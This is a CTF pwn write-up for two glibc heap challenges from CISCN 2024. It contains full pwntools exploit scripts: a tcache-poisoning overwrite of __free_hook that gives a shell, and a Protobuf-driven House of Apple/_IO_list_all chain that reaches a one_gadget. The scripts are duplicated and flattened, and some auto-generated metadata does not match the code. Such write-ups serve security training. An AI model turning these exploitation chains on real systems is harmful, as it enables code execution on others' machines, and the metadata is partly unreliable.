---
title: UKFC2024 CISCN 华北赛区 pwn 方向 WP
contest: UKFC2024 / CISCN 华北
year: 2024
difficulty: medium
vuln_type: esoteric
tags:
- book-manager
- tcache-poisoning
- free-hook-system
- protobuf
- house-of-apple
- setcontext-srop
- largebin-attack
attack_chain:
- 'book: 4 菜单 (add/show/edit/delete) 经典堆题'
- add(0x4f8, 'a') + add(0x38, 'b') + add(0x4f8, 'c') + add(0x38, '/bin/sh')
- delete(0); edit(1, 'a'*0x30 + p64(0x540)) 制造 fake size
- delete(2) 触发 unsorted bin 残余
- add(0x4f8, 'a'); show(1) 泄 libc → __free_hook = system
- add(4, 0x38, 'd'); delete(4) 触发 tcache 残余
- edit(1, p64(leak + __free_hook)); add(5, 0x38, 'aa'); add(6, 0x38, p64(system))
- free 触发 system('/bin/sh')
- 'proc: Protobuf 序列化 msg { content, idx, size }'
- 5 菜单 (add/show/edit/delete/exit) 走 Protobuf 协议
- add(0x540, 'aaa') + add(0x530, 'bbb') → unsorted bin 泄 libc
- setcontext+61 + _IO_wfile_jumps 链 House of Apple
- edit(0, 0x1f, p64(0)*3 + p64(io_all-0x20)) 改 _IO_list_all
- delete(7) 触发 exit flush → 调 _IO_wfile_overflow → SROP
- 0xe3b01 one_gadget 弹 shell
key_payload: tcache poisoning __free_hook = system
one_liner: UKFC2024 CISCN 华北 pwn 2 题：book tcache poisoning + proc Protobuf 序列化 House of Apple SROP。
lesson: Protobuf 序列化通信的程序，size 字段是 sint64/2 实际大小；House of Apple 配合 setcontext+61 是 libc-2.35 主流打法。
quality: high
full_path: UKFC2024_CISCN华北赛区pwn方向WP.full.md
meta_path: UKFC2024_CISCN华北赛区pwn方向WP.meta.md
images_removed: true
images_removed_count: 2
schema_version: v3.0.0-P0
summary: 'UKFC2024 CISCN 华北赛区 pwn 方向 WP。UKFC2024 CISCN 华北 pwn 2 题：book tcache poisoning + proc Protobuf 序列化 House of Apple SROP。。关键路径：book: 4 菜单 (add/show/edit/delete) 经典堆题 → add(0x4f8, ''a'') + add(0x38, ''b'')...'
category: pwn
subcategory: pwn_other
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 2
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/191289.html
reasoning_chain:
- book → add(0x4f8) + add(0x38) + add(0x4f8) + add(0x38) → 触发点：4 菜单堆题经典布局
- delete(0) + edit(1, 'a'*0x30 + p64(0x540)) → 假设：制造 fake size 触发 unsorted bin
- delete(2) → unsorted bin 残余 → show(1) → 观察：泄 libc
- 假设：tcache poisoning → __free_hook = system → 动作：edit(1, p64(leak + __free_hook))
- 观察：add(6, 0x38, p64(system)) 后 free('/bin/sh') → system('/bin/sh')
- proc → Protobuf 序列化 msg{content, idx, size} → 触发点：size 字段 sint64/2 实际大小
- add(0x540) + add(0x530) → unsorted bin 泄 libc → 假设：House of Apple + setcontext SROP
- 动作：edit(0, 0x1f, p64(0)*3 + p64(io_all-0x20)) → 改 _IO_list_all
- delete(7) 触发 exit flush → 调 _IO_wfile_overflow → SROP → 0xe3b01 one_gadget
failed_attempts:
- 试图用 fastbin attack 0x6020ad → 失败：glibc 2.35 已加强 fastbin 检查
- 试图直接覆盖 _IO_list_all → 失败：需配合 fake file structure
key_observations:
- tcache poisoning + __free_hook = system 是 libc 2.31- 主流打法
- Protobuf 序列化通信时 size/2 是常见约定（sint64 zigzag）
- House of Apple + setcontext+61 是 libc 2.35 主流 RCE 路径
- _IO_list_all 改写到 fake file structure 触发 exit flush RCE
prerequisites:
- glibc heap tcache 机制（chunk / fd / size）
- Protobuf 序列化协议
- House of Apple + setcontext SROP 链构造
- libc-2.35 one_gadget 查找
---
# UKFC2024 CISCN华北赛区pwn方向WP

> 原文: https://www.ctfiot.com/191289.html
> ID: 191289

from pwn import * p=remote('8.147.133.173',44514) elf=ELF("./book") libc=elf.libc def debug(): gdb.attach(p) pause() context.log_level='debug' def cmd(idx): p.sendlineafter(b'(4) delete a book',str(idx)) def add(idx,size,cnt): cmd(1) p.sendlineafter(b'Index:',str(idx)) p.sendlineafter(b'Size:',str(size)) p.sendlineafter(b'Content:',cnt) def show(idx): cmd(2) p.sendlineafter(b'Index:',str(idx)) def edit(idx,cnt): cmd(3) p.sendlineafter(b'ndex:',str(idx)) p.sendafter(b'Content:',cnt) def delete(idx): cmd(4) p.sendlineafter(b'Index:',str(idx)) add(0,0x4f8,b'a') add(1,0x38,b'b') add(2,0x4f8,b'c') add(3,0x38,b'/bin/sh') delete(0) edit(1,b'a'*0x30+p64(0x540)) delete(2) add(0,0x4f8,b'a') show(1) p.recvline() leak=u64(p.recv(6).ljust(8,b'x00'))-(0x71dee3febca0-0x71dee3c00000) # print(hex(leak)) add(4,0x38,b'd') delete(4) edit(1,p64(leak+libc.symbols['__free_hook'])) add(5,0x38,b'aa') add(6,0x38,p64(leak+libc.symbols['system'])) p.interactive()

syntax = "proto2"; package ctf; message msg{ required bytes content = 3; required int64 idx = 2; required sint64 size = 1; }

from pwn import * import ctf_pb2 p=process('proc') p=remote('39.106.48.123',38932) elf=ELF("./proc") libc=elf.libc #libc=ELF('./libc-2.23.so') def debug(): gdb.attach(p) pause() context.log_level='debug' def cmd(idx): p.sendafter(b'your choice: ',str(idx)) menu=b'5. exit' def add(msgsize, msgcontent = b''): d = ctf_pb2.msg() d.idx = 0 d.size = msgsize//2 d.content = msgcontent strs = d.SerializeToString() p.sendafter(menu, strs) cmd(1) def delete(msgidx): d = ctf_pb2.msg() d.idx = msgidx d.size = 0//2 d.content = b'' strs = d.SerializeToString() p.sendafter(menu, strs) cmd(3) def show(msgidx): d = ctf_pb2.msg() d.idx = msgidx d.size = 0//2 d.content = b'' strs = d.SerializeToString() p.sendafter(menu, strs) cmd(4) def edit(msgidx, size,msgcontent): d = ctf_pb2.msg() d.idx = msgidx d.size = size//2 d.content = msgcontent strs = d.SerializeToString() p.sendafter(menu, strs) cmd(2) add(0x540,b'aaa')#0 add(0x530,b'bbb')#1 delete(0) show(0) p.recvuntil(b'Content: ') libc_base=u64(p.recv(6).ljust(8,b'x00'))-(0x00007f44c80bfbe0-0x7f44c7ed3000) lock = libc_base+(0x7c0e66f2d7d0-0x7c0e66d3f000) wfile = libc_base + libc.sym['_IO_wfile_jumps'] setcontext=libc_base+libc.symbols['setcontext']+61 io_all = libc_base + libc.sym['_IO_list_all'] print(hex(libc_base)) add(0x540,b'ccc')#2 add(0x460,b'ggg')#3 #delete(0) add(0x550,b'ajsdbjabkjs') #4 add(0x460,b'hhh')#5 add(0x530,b'h')#6 delete(3) delete(5) show(5) p.recvuntil(b'Content: ') heap=u64(p.recv(6).ljust(8,b'x00'))-(0x00006207b8bf8d80-0x6207b8bf8000) print(hex(heap)) heap+=0x58d7e5b8b100-0x58d7e5b89000 pl=b'a'*0x20+p64(0)*3 #2e0 pl+=p64(0) pl+=p64(0)*7 pl+=p64(lock) #_lock pl+=p64(0)*2 pl+=p64(heap + 0xe0) pl+=p64(0)*6 pl+=p64(wfile) #__GI__IO_wfile_jumps pl+=p64(0)*0x1c pl+=p64(heap +0xe0+ 0xe8) #_IO_jump_t pl+=p64(0)*0xd pl+=p64(libc_base+0xe3b01) add(0x530,pl)#7 delete(0) add(0x550,b'aaaa')#8 edit(0,0x1f,p64(0)*3+p64(io_all-0x20)) delete(7) add(0x550,b'kkkk')#9 p.interactive()


```
from pwn import * p=remote('8.147.133.173',44514) elf=ELF("./book") libc=elf.libc def debug(): gdb.attach(p) pause() context.log_level='debug' def cmd(idx): p.sendlineafter(b'(4) delete a book',str(idx)) def add(idx,size,cnt): cmd(1) p.sendlineafter(b'Index:',str(idx)) p.sendlineafter(b'Size:',str(size)) p.sendlineafter(b'Content:',cnt) def show(idx): cmd(2) p.sendlineafter(b'Index:',str(idx)) def edit(idx,cnt): cmd(3) p.sendlineafter(b'ndex:',str(idx)) p.sendafter(b'Content:',cnt) def delete(idx): cmd(4) p.sendlineafter(b'Index:',str(idx)) add(0,0x4f8,b'a') add(1,0x38,b'b') add(2,0x4f8,b'c') add(3,0x38,b'/bin/sh') delete(0) edit(1,b'a'*0x30+p64(0x540)) delete(2) add(0,0x4f8,b'a') show(1) p.recvline() leak=u64(p.recv(6).ljust(8,b'x00'))-(0x71dee3febca0-0x71dee3c00000) # print(hex(leak)) add(4,0x38,b'd') delete(4) edit(1,p64(leak+libc.symbols['__free_hook'])) add(5,0x38,b'aa') add(6,0x38,p64(leak+libc.symbols['system'])) p.interactive()
syntax = "proto2"; package ctf; message msg{ required bytes content = 3; required int64 idx = 2; required sint64 size = 1; }
from pwn import * import ctf_pb2 p=process('proc') p=remote('39.106.48.123',38932) elf=ELF("./proc") libc=elf.libc #libc=ELF('./libc-2.23.so') def debug(): gdb.attach(p) pause() context.log_level='debug' def cmd(idx): p.sendafter(b'your choice: ',str(idx)) menu=b'5. exit' def add(msgsize, msgcontent = b''): d = ctf_pb2.msg() d.idx = 0 d.size = msgsize//2 d.content = msgcontent strs = d.SerializeToString() p.sendafter(menu, strs) cmd(1) def delete(msgidx): d = ctf_pb2.msg() d.idx = msgidx d.size = 0//2 d.content = b'' strs = d.SerializeToString() p.sendafter(menu, strs) cmd(3) def show(msgidx): d = ctf_pb2.msg() d.idx = msgidx d.size = 0//2 d.content = b'' strs = d.SerializeToString() p.sendafter(menu, strs) cmd(4) def edit(msgidx, size,msgcontent): d = ctf_pb2.msg() d.idx = msgidx d.size = size//2 d.content = msgcontent strs = d.SerializeToString() p.sendafter(menu, strs) cmd(2) add(0x540,b'aaa')#0 add(0x530,b'bbb')#1 delete(0) show(0) p.recvuntil(b'Content: ') libc_base=u64(p.recv(6).ljust(8,b'x00'))-(0x00007f44c80bfbe0-0x7f44c7ed3000) lock = libc_base+(0x7c0e66f2d7d0-0x7c0e66d3f000) wfile = libc_base + libc.sym['_IO_wfile_jumps'] setcontext=libc_base+libc.symbols['setcontext']+61 io_all = libc_base + libc.sym['_IO_list_all'] print(hex(libc_base)) add(0x540,b'ccc')#2 add(0x460,b'ggg')#3 #delete(0) add(0x550,b'ajsdbjabkjs') #4 add(0x460,b'hhh')#5 add(0x530,b'h')#6 delete(3) delete(5) show(5) p.recvuntil(b'Content: ') heap=u64(p.recv(6).ljust(8,b'x00'))-(0x00006207b8bf8d80-0x6207b8bf8000) print(hex(heap)) heap+=0x58d7e5b8b100-0x58d7e5b89000 pl=b'a'*0x20+p64(0)*3 #2e0 pl+=p64(0) pl+=p64(0)*7 pl+=p64(lock) #_lock pl+=p64(0)*2 pl+=p64(heap + 0xe0) pl+=p64(0)*6 pl+=p64(wfile) #__GI__IO_wfile_jumps pl+=p64(0)*0x1c pl+=p64(heap +0xe0+ 0xe8) #_IO_jump_t pl+=p64(0)*0xd pl+=p64(libc_base+0xe3b01) add(0x530,pl)#7 delete(0) add(0x550,b'aaaa')#8 edit(0,0x1f,p64(0)*3+p64(io_all-0x20)) delete(7) add(0x550,b'kkkk')#9 p.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]